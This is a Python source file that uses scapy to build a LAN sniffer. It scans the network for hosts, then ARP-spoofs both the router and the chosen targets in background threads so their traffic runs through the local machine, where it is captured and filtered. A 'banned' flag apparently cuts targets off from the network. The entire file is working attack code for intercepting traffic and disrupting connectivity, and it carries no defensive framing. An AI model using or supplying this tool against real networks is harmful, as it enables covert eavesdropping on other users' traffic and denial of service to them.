import threading
import time

from scapy.arch import get_if_addr, get_if_hwaddr
from scapy.config import conf
from scapy.layers import l2, inet
from scapy.packet import Packet
from scapy.sendrecv import sendp, srp, sniff


class Target:
    def __init__(self, ip: str, mac: str):
        self.ip = ip
        self.mac = mac
        self.monitor = True
        self.banned = False

    def __str__(self):
        return self.ip + ' at ' + self.mac

    def __repr__(self):
        return self.ip


class Sniffer:
    def __init__(self, iff=conf.iface):
        """
        LAN Network sniffer using ARP spoofing
        :param iff: LAN interface
        """
        self.local_ip = get_if_addr(iff)
        self.local_mac = get_if_hwaddr(iff)
        self.router_ip = conf.route.route('0.0.0.0')[2]
        self.router_mac = l2.getmacbyip(self.router_ip)
        print("local mac :", self.local_mac)
        print("local ip  :", self.local_ip)
        print("router mac:", self.router_mac)
        print("router ip :", self.router_ip)
        self.targets = dict()

    def scan(self, net_addr: str):
        """
        Scan LAN, discover sniffable hosts
        :param net_addr: network address `x.x.x.x/x`
        """
        self.targets.clear()
        while len(self.targets) == 0:
            req = l2.Ether(dst='ff:ff:ff:ff:ff:ff') / l2.ARP(pdst=net_addr)
            ress = srp(req, timeout=2, verbose=False)[0]
            for res in ress:
                ip = res[1].psrc
                mac = res[1].hwsrc
                if res[1].psrc not in [self.router_ip, self.local_ip]:
                    self.targets[ip] = Target(ip, mac)
            time.sleep(3)

    def add(self, ip: str):
        mac = l2.getmacbyip(ip)
        if mac is not None:
            self.targets[ip] = Target(ip, mac)

    def start(self, on_recv: callable):
        """
        Start sniffing
        :param on_recv: a callback function when receiving a packet
        """
        print("start sniffing on %d hosts" % len(self.targets))
        threading.Thread(target=self._spoof_router).start()
        threading.Thread(target=self._spoof_targets).start()
        sniff(lfilter=self._filter, prn=on_recv)

    def _spoof_router(self):
        """
        ARP spoof router
        """
        while True:
            for target in self.targets.values():
                if target.monitor and not target.banned:
                    p = l2.Ether(dst=self.router_mac) / \
                        l2.ARP(op=2, psrc=target.ip, pdst=self.router_ip, hwsrc=self.local_mac)
                    sendp(p, verbose=False)
            time.sleep(2)

    def _spoof_targets(self):
        """
        ARP spoof targets
        """
        while True:
            for target in self.targets.values():
                if target.monitor:
                    p = l2.Ether(dst=target.mac) / \
                        l2.ARP(op=2, psrc=self.router_ip, pdst=target.ip, hwsrc=self.local_mac)
                    sendp(p, verbose=False)
            time.sleep(2)

    def _filter(self, p: Packet):
        """
        Filter packets to make sure we only process on our target's packet
        :param p: packet to be determined
        """
        return p.haslayer(inet.IP) and (p[inet.IP].src in self.targets or p[inet.IP].dst in self.targets)
